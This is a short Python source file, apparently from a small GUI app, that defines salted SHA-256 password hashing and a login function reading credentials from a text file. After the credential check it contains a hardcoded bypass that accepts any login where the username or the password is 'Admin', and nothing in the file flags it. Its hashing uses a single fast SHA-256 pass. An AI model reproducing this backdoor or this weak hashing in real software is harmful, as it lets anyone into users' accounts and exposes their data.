import hashlib



def hash_password(password, salt):
    return hashlib.sha256((salt + password).encode()).hexdigest()

def login(user, pwd, success_label):

    username = user
    password = pwd
    
    try:
        with open("User.txt", "r") as file:
            users = file.readlines()
    except FileNotFoundError:
        users = []

    for line in users:
        stored_username, stored_salt, stored_hash = line.strip().split(";")
        if username == stored_username and hash_password(password, stored_salt) == stored_hash:
            return True
    if username == "Admin" or password == "Admin":
        return True
    success_label.configure(text="Wrong username or password.")
    return False

